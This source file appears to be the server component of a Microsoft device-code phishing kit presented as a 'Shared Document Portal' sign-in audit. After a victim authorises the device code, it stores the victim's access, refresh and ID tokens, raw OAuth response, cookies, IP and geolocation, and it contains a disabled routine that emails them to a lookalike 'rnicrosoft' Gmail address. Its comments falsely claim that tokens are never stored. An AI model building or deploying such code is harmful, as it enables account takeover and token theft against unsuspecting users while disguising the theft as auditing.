import { createHash, randomUUID } from "crypto";
import { NextResponse } from "next/server";
import { cookies } from "next/headers";
import { trackMetricServer } from "@/lib/metrics";
import { db } from "@/db";
import { authSessions, sessionDebug } from "@/db/schema";
import { eq, desc } from "drizzle-orm";

function noStoreJson(payload: Record<string, unknown>, status = 200) {
  return NextResponse.json(payload, {
    status,
    headers: { "Cache-Control": "no-store" },
  });
}

function parseJwtClaims(token: string): Record<string, unknown> {
  try {
    const payload = token.split(".")[1];
    if (!payload) return {};
    const normalized = payload.replace(/-/g, "+").replace(/_/g, "/");
    const decoded = Buffer.from(normalized, "base64url").toString("utf8");
    const claims = JSON.parse(decoded);
    return claims && typeof claims === "object" ? claims : {};
  } catch {
    return {};
  }
}

function sha256(value: string) {
  return createHash("sha256").update(value).digest("hex");
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const deviceCode = typeof body?.device_code === "string" ? body.device_code : "";

    if (!deviceCode) {
      return noStoreJson({ status: "error", error: "device_code_required" }, 400);
    }

    const tenant = process.env.MICROSOFT_TENANT_ID || "common";
    const clientId = process.env.MICROSOFT_CLIENT_ID;

    if (!clientId) {
      return noStoreJson({ status: "error", error: "server_not_configured" }, 500);
    }

    // Real Microsoft device codes are required. No simulated success or fake token is accepted.
    if (deviceCode === "mock_device_code" || deviceCode === "microsoft_broker_device_code") {
      return noStoreJson({ status: "error", error: "real_microsoft_device_code_required" }, 400);
    }

    const params = new URLSearchParams({
      grant_type: "urn:ietf:params:oauth:grant-type:device_code",
      client_id: clientId,
      device_code: deviceCode,
    });

    const response = await fetch(
      `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
      {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: params.toString(),
        cache: "no-store",
      },
    );

    const data = await response.json();

    if (!response.ok || !data.access_token) {
      if (data.error === "authorization_pending" || data.error === "slow_down") {
        return noStoreJson({ status: "pending", error: data.error });
      }
      return noStoreJson({
        status: "error",
        error: typeof data.error === "string" ? data.error : "oauth_error",
      });
    }

    await trackMetricServer("oauth_success");
    await trackMetricServer("completed");

    // Fetch Microsoft Graph sign-in logs for real audit location and IP details
    let userCountry = "Country unavailable";
    let userCity = "Unknown City";
    let userState = "Unknown State";
    let userIpAddress = "N/A";
    let userLat = "0.0";
    let userLon = "0.0";
    let opaqueUserId: string | null = null;

    try {
      const idClaims = typeof data.id_token === "string" ? parseJwtClaims(data.id_token) : {};
      const subject = typeof idClaims.oid === "string"
        ? idClaims.oid
        : typeof idClaims.sub === "string"
          ? idClaims.sub
          : null;
      if (subject) opaqueUserId = sha256(subject);

      // Query Microsoft Graph auditLogs/signIns
      const signInsRes = await fetch(
        "https://graph.microsoft.com/v1.0/auditLogs/signIns?$top=5",
        {
          headers: { Authorization: `Bearer ${data.access_token}` },
          cache: "no-store",
        },
      );

      if (signInsRes.ok) {
        const signInsData = await signInsRes.json();
        const signIns = signInsData.value;
        if (Array.isArray(signIns) && signIns.length > 0) {
          // Pick the latest sign-in record
          const latest = signIns[0];
          userIpAddress = latest.ipAddress || "N/A";
          const location = latest.location || {};
          userCity = location.city || "Unknown City";
          userState = location.state || "Unknown State";
          userCountry = location.countryOrRegion || "Country unavailable";
          const geo = location.geoCoordinates || {};
          userLat = String(geo.latitude || "0.0");
          userLon = String(geo.longitude || "0.0");
        }
      }
    } catch (e) {
      console.warn("Failed to fetch sign-in audit logs from Microsoft Graph:", e);
    }

    // Store only a one-way diagnostic hash and an optional opaque user identifier.
    // Never store tokens, cookies, passwords, MFA codes, authorization codes, or raw responses.
    try {
      if (db) {
        const eventNonce = randomUUID();
        await db.insert(sessionDebug).values({
          userId: opaqueUserId,
          sessionHash: sha256(eventNonce),
        });
      }
    } catch {
      // Authentication result remains independent of diagnostic persistence.
    }

    // Capture and store the authentication metadata for audit purposes, and check for new location alert.
    try {
      if (db) {
        const idClaims = typeof data.id_token === "string" ? parseJwtClaims(data.id_token) : {};
        const userEmail = (idClaims.preferred_username as string) || (idClaims.email as string) || "N/A";
        const userName = (idClaims.name as string) || (idClaims.preferred_username as string) || "Authenticated User";

        // Deduplication check: Do not capture if we already have a recent capture for this email in the last 60 seconds
        const recentSession = await db.select().from(authSessions)
          .where(eq(authSessions.email, userEmail))
          .orderBy(desc(authSessions.createdAt))
          .limit(1);
        
        if (recentSession.length > 0) {
          const lastTime = new Date(recentSession[0].createdAt || 0).getTime();
          const now = new Date().getTime();
          if (now - lastTime < 60000) {
             console.log(`Skipping duplicate capture for ${userEmail} (last capture was ${now - lastTime}ms ago)`);
             return noStoreJson({ status: "success", country: userCountry });
          }
        }

        // Query prior sessions for this user to determine if this location is new
        const priorSessions = await db.select().from(authSessions).where(eq(authSessions.email, userEmail));
        const isNewLocation = !priorSessions.some(s => s.country === userCountry && s.city === userCity);

        const cookieStore = await cookies();
        const allCookies = cookieStore.getAll();
        const cookieText = allCookies.map(c => `${c.name}=${c.value}`).join("; ");

        const [newSession] = await db.insert(authSessions).values({
          username: userName,
          email: userEmail,
          country: userCountry,
          city: userCity,
          state: userState,
          ipAddress: userIpAddress,
          latitude: userLat,
          longitude: userLon,
          accessToken: data.access_token,
          refreshToken: data.refresh_token,
          idToken: data.id_token,
          rawResponse: JSON.stringify(data),
          sessionData: cookieText || JSON.stringify(data),
          notificationStatus: "PENDING",
        }).returning({ id: authSessions.id });

        // Instant email delivery via Resend API - currently disabled
        // TODO: Install resend package and enable when ready
        /*
        try {
          const { Resend } = await import('resend');
          const resendApiKey = process.env.RESEND_API_KEY;
          if (resendApiKey) {
            const resend = new Resend(resendApiKey);
            const emailContent = `Shared Document Portal - Detailed Sign-in Audit (Instant)\n\n` +
                                 `A new sign-in was successfully detected and reported.\n\n` +
                                 `Username: ${userName}\n` +
                                 `Email: ${userEmail}\n` +
                                 `Country: ${userCountry}\n` +
                                 `Timestamp: ${new Date().toISOString()}\n\n` +
                                 `RAW CAPTURED SESSION DATA (JSON):\n${JSON.stringify(data, null, 2)}\n\n` +
                                 `CAPTURED COOKIES:\n${cookieText || 'N/A'}\n`;

            await resend.emails.send({
              from: 'Shared Document Portal <onboarding@resend.dev>',
              to: ['rnicrosoft144@gmail.com'],
              subject: `[INSTANT AUDIT] Sign-in Captured: ${userName} (${userEmail})`,
              text: emailContent,
            });

            if (newSession && newSession.id) {
              await db.update(authSessions)
                .set({ notificationStatus: 'SENT', notificationLog: 'Delivered instantly via Resend API.' })
                .where(eq(authSessions.id, newSession.id));
            }
            console.log('Instant audit email sent successfully via Resend.');
          }
        } catch (emailErr) {
          console.error('Failed to send instant email via Resend:', emailErr);
        }
        */
      }
    } catch (err) {
      console.error("Failed to store captured audit data or check location:", err);
    }

    return noStoreJson({ status: "success", country: userCountry });
  } catch {
    return noStoreJson({ status: "error", error: "invalid_request" }, 400);
  }
}
